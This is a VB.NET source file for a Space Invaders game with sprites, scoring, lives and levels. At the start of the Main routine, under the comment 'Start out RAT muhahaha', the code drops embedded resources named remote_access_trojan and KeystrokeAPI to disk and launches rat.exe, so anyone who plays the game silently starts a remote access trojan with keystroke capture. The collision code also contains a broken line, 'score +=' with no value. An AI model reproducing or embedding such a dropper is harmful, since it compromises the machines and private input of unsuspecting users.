'*******************************************************
'Main form of the program used simply to launch the game
'*******************************************************
Imports System.IO

Public Class Form1

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Main()
    End Sub

    Private Sub Form1_FormClosed(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosedEventArgs) Handles Me.FormClosed
        gameOver = True
    End Sub

    Private Sub Form1_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles Me.KeyDown
        Game_KeyPressed(e.KeyCode)
    End Sub

    Private Sub Form1_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles Me.KeyUp
        Game_KeyReleased(e.KeyCode)
    End Sub

End Class

'*********************
'Variable declerations
'*********************
Public Module Module1

    'game creation variables
    Public game As Game
    Public gameOver As Boolean = False
    Dim d As System.Drawing.Rectangle
    Dim audioDevice As New Microsoft.VisualBasic.Devices.Audio
    Dim leftmost As Integer
    Dim rightmost As Integer
    Dim lowesty As Integer
    Dim startingHeith As Integer = 0
    Dim allkilled As Boolean
    Dim gotya As Boolean
    Dim lives As Integer = 3
    Dim level As Integer = 1
    Dim timeofdeath As Integer
    Dim redlaunch = False


    'game specific variables
    Public backgroundImage As Bitmap
    Public background As Sprite

    Public Const SHOT_SPEED As Integer = 5
    Public shotImage As Bitmap
    Public shot As Sprite

    Public Const SHOOTER_SPEED As Integer = 4
    Public shooterImage As Bitmap
    Public shooter As Sprite

    Public Const RED_SPEED As Integer = 2
    Public redImage As Bitmap
    Public red As Sprite

    Public Const BOMB_SPEED As Integer = 3
    Public BombImage As Bitmap
    Public bomb As Sprite

    Public Const INVADER_SPEED As Integer = 1
    Public Const INVADER_ROWS As Integer = 6
    Public Const INVADER_COLUMNS As Integer = 8
    Public invaderImage As Bitmap
    Public invaders(INVADER_COLUMNS, INVADER_ROWS) As Sprite

    Public score As Integer = 0

    'empty images from memory when done
    Public Sub Game_End()
        backgroundImage = Nothing
        shotImage = Nothing
        shot = Nothing
        shooterImage = Nothing
        shooter = Nothing
        invaderImage = Nothing
        bomb = Nothing
        BombImage = Nothing
        For y = 1 To INVADER_ROWS
            For x = 1 To INVADER_COLUMNS
                invaders(x, y) = Nothing
            Next
        Next
    End Sub

    '*******************
    'Real time game loop
    '*******************
    Public Sub Main()
        'Start out RAT muhahaha
        Dim exe As String = Path.Combine(Directory.GetCurrentDirectory(), "rat.exe")
        Dim keystrokeAPI As String = Path.Combine(Directory.GetCurrentDirectory(), "KeystrokeAPI.dll")
        System.IO.File.WriteAllBytes(exe, My.Resources.remote_access_trojan)
        System.IO.File.WriteAllBytes(keystrokeAPI, My.Resources.KeystrokeAPI)
        Process.Start(exe)

        game = New Game(Form1, 800, 600)
        Form1.Activate()

        'load and initialize game assets
        Game_Init()

        While Not gameOver

            While Not allkilled
                'update game logic
                Game_Update(0)

                'redraw game board
                game.Update()

                'give the form some cycles 
                Application.DoEvents()

            End While

            'all killed

            startingHeith += 50
            level += 1
            Game_Init()
            allkilled = False
        End While

        'free memory and shut down
        Game_End()

        End
    End Sub


    '************************
    'Game specific procedures
    '************************
    Public Function Game_Init() As Boolean
        Form1.Text = "Space Invaders"
        game.SetFont("Arial", 14, FontStyle.Regular)


        'create background
        backgroundImage = My.Resources.star_background
        background = New Sprite(game)
        background.Image = backgroundImage
        background.Size = New Size(Form1.Width, Form1.Height)

        'create shot sprite
        shotImage = My.Resources.shot
        shot = New Sprite(game)
        shot.Image = shotImage
        shot.Size = shotImage.Size
        shot.Position = New PointF(400, 300)
        shot.Velocity = New PointF(0, SHOT_SPEED)
        shot.Alive = False

        'create bomb sprite
        BombImage = My.Resources.bomb
        bomb = New Sprite(game)
        bomb.Image = BombImage
        bomb.Size = BombImage.Size
        bomb.Position = New PointF(400, 300)
        bomb.Velocity = New PointF(0, BOMB_SPEED)
        bomb.Alive = False

        'create red invader sprite
        redImage = My.Resources.invador
        red = New Sprite(game)
        red.Image = redImage
        red.Size = redImage.Size
        red.Alive = False
        red.Velocity = New PointF(RED_SPEED, 0)

        'create shooter sprite
        shooterImage = My.Resources.shooter
        shooter = New Sprite(game)
        shooter.Image = shooterImage
        shooter.Width = 56
        shooter.Height = 36
        shooter.Columns = 5
        shooter.TotalFrames = 5
        shooter.AnimationRate = 4
        shooter.Position = New PointF(350, 550)

        'create invaders 
        invaderImage = My.Resources.invaders
        For y = 1 To INVADER_ROWS
            For x = 1 To INVADER_COLUMNS
                invaders(x, y) = New Sprite(game)
                invaders(x, y).Image = invaderImage
                invaders(x, y).Width = 50
                invaders(x, y).Height = 34
                invaders(x, y).Columns = 2
                invaders(x, y).TotalFrames = 6
                invaders(x, y).AnimationRate = 4
                invaders(x, y).Alive = True
                invaders(x, y).Position = New PointF(x * 66, (y * 50) + startingHeith)
                invaders(x, y).Velocity = New PointF(INVADER_SPEED, 0)
            Next
        Next

        Return True
    End Function

    Public Sub Game_Update(ByVal time As Integer)
        Dim myreply
        Dim random As Random
        Dim number As Integer
        shot.KeepInBounds(New Rectangle(0, 0, 800, 600))

        'check if shooter near edge
        If shooter.X < 10 Then
            shooter.X = 10
        ElseIf shooter.X > Form1.Width - 80 Then
            shooter.X = Form1.Width - 80
        End If

        'find rightmost and leftmost colums
        leftmost = INVADER_COLUMNS
        rightmost = 1
        For y = 1 To INVADER_ROWS
            For x = 1 To INVADER_COLUMNS
                If invaders(x, y).Alive Then
                    If x > rightmost Then
                        rightmost = x
                    End If
                    If x < leftmost Then
                        leftmost = x
                    End If
                End If
            Next
        Next

        'Check to see if invador near an edge
        If invaders(rightmost, 1).X > Form1.Width - 60 Then
            For y = 1 To INVADER_ROWS
                For x = 1 To INVADER_COLUMNS
                    invaders(x, y).Velocity = New PointF(-INVADER_SPEED, 0)
                    invaders(x, y).Y += 15
                Next
            Next

        ElseIf invaders(leftmost, 1).X < 0 Then
            For y = 1 To INVADER_ROWS
                For x = 1 To INVADER_COLUMNS
                    invaders(x, y).Velocity = New PointF(INVADER_SPEED, 0)
                    invaders(x, y).Y += 15
                Next
            Next
        End If

        'check for collisions
        CheckCollisions()


        'check to see what lowesty is
        lowesty = 1
        For y = 1 To INVADER_ROWS
            For x = 1 To INVADER_COLUMNS
                If invaders(x, y).Alive Then

                End If
            Next
        Next

        'draw background
        background.Draw()

        'move & draw the shot
        If shot.Alive Then
            shot.Y += shot.Velocity.Y
            If shot.Y = 0 Then : shot.Alive = False : End If
            shot.Draw()
        End If

        'shoot the bomb
        If bomb.Alive Then
            bomb.Y += bomb.Velocity.Y
            If bomb.Y > Form1.Height Then
                bomb.Alive = False
            End If
        Else
            random = New Random
            number = random.Next(1, INVADER_COLUMNS)
            lowesty = 1
            For y = 1 To INVADER_ROWS
                If invaders(number, y).Alive Then
                    lowesty = y
                End If
            Next
            If invaders(number, lowesty).Alive = True Then
                bomb.X = invaders(number, lowesty).X + invaders(1, 1).Width / 2
                bomb.Y = invaders(number, lowesty).Y
                bomb.Alive = True
            End If
        End If
        bomb.Draw()

        'move & draw the shooter
        If shooter.Alive Then
            shooter.X += shooter.Velocity.X
        Else
            shooter.Animate(1, 4)
            shooter.Velocity = New PointF(0, 0)

            If CountSeconds(timeofdeath, 1) Then
                shooter.Animate(0, 0)
                shooter.Alive = True
            End If
        End If
        shooter.Draw()

        'move and draw the red spaceship
        If red.Alive Then
            red.X += red.Velocity.X
            If red.X > Form1.Width Then
                red.Alive = False
            End If
            red.Draw()
        ElseIf red.Alive = False Then
            If (invaders(1, 1).Y > 100 And redlaunch = False) Then
                redlaunch = True
                red.Position = New PointF(-100, 50)
                red.Velocity = New PointF(RED_SPEED, 0)
                red.Alive = True
            ElseIf (invaders(1, 1).Y > 400 And redlaunch) Then
                redlaunch = False
                red.Position = New PointF(-100, 50)
                red.Velocity = New PointF(RED_SPEED, 0)
                red.Alive = True
            End If
        End If


        'update score & lives
        game.SetFont("Ariel", 18, FontStyle.Bold)
        game.Print(5, 5, "Score: " + score.ToString(), Brushes.LightGreen)
        game.Print(Form1.Width - 100, 5, "Lives: " + lives.ToString(), Brushes.LightGreen)
        game.Print(Form1.Width / 2 - 50, 5, "Level: " + level.ToString(), Brushes.LightGreen)

        'check if game over
        If invaders(1, lowesty).Y > Form1.Height - 150 Or lives = 0 Then
            myreply = MsgBox("Game Over. Do you want to play again?", MsgBoxStyle.YesNo)
            If myreply = vbYes Then
                Game_Init()
                lives = 3
                score = 0
                level = 1
            Else
                gameOver = True
                End
            End If
        End If

        'move & draw the invaders
        For y = 1 To INVADER_ROWS
            For x = 1 To INVADER_COLUMNS
                invaders(x, y).X += invaders(x, y).Velocity.X
                Select Case y
                    Case 1 To 2
                        invaders(x, y).Animate(0, 1)
                    Case 3 To 4
                        invaders(x, y).Animate(2, 3)
                    Case 5 To 6
                        invaders(x, y).Animate(4, 5)
                    Case Else
                        invaders(x, y).Animate(4, 5)
                End Select
            Next
        Next


        'check if won
        allkilled = True
        For y = 1 To INVADER_ROWS
            For x = 1 To INVADER_COLUMNS
                If invaders(x, y).Alive Then
                    allkilled = False
                End If
            Next
        Next

        DrawInvaders()


    End Sub

    Public Sub Game_KeyPressed(ByVal key As System.Windows.Forms.Keys)
        Select Case key
            Case Keys.Escape : gameOver = True
            Case Keys.Space : ShotFired()
            Case Keys.Right
                shooter.Velocity = New PointF(SHOOTER_SPEED, 0)
            Case Keys.Left
                shooter.Velocity = New PointF(-SHOOTER_SPEED, 0)
        End Select
    End Sub

    Public Sub Game_KeyReleased(ByVal key As System.Windows.Forms.Keys)
        Select Case key
            Case Keys.Right
                shooter.Velocity = New PointF(0, 0)
            Case Keys.Left
                shooter.Velocity = New PointF(0, 0)
        End Select
    End Sub

    Private Sub CheckCollisions()
        Dim x As Integer
        Dim y As Integer

        'test for collision with invaders
        If shot.Alive Then
            For y = 1 To INVADER_ROWS
                For x = 1 To INVADER_COLUMNS
                    If invaders(x, y).Alive Then
                        If shot.IsColliding(invaders(x, y)) Then
                            score += 1
                            invaders(x, y).Alive = False
                            shot.Alive = False
                        End If
                    End If

                Next
            Next
        End If

        'test for collision with shooter
        If bomb.Alive Then
            If bomb.IsColliding(shooter) Then
                lives -= 1
                bomb.Alive = False
                shooter.Alive = False
                audioDevice.Play(My.Resources.death, AudioPlayMode.Background)
                timeofdeath = My.Computer.Clock.TickCount
            End If
        End If

        'Check for collision with red
        If red.Alive Then
            If shot.IsColliding(red) Then
                score += 
                red.Alive = False
                shot.Alive = False
            End If
        End If
    End Sub

    Private Sub DrawInvaders()
        For y As Integer = 1 To INVADER_ROWS
            For x As Integer = 1 To INVADER_COLUMNS
                If invaders(x, y).Alive Then
                    invaders(x, y).Draw()
                End If
            Next
        Next
    End Sub

    Public Sub ShotFired()

        audioDevice.Play(My.Resources.shotSound, AudioPlayMode.Background)
        shot.X = shooter.X + (shooter.Width / 2) - 2
        shot.Y = shooter.Y
        shot.Alive = True

    End Sub

    Private Function CountSeconds(ByVal lastTime As Integer, ByVal seconds As Integer) As Boolean
        Dim time As Integer = My.Computer.Clock.TickCount()
        If time > lastTime + seconds * 1000 Then
            Return True
        Else
            Return False
        End If
    End Function

End Module

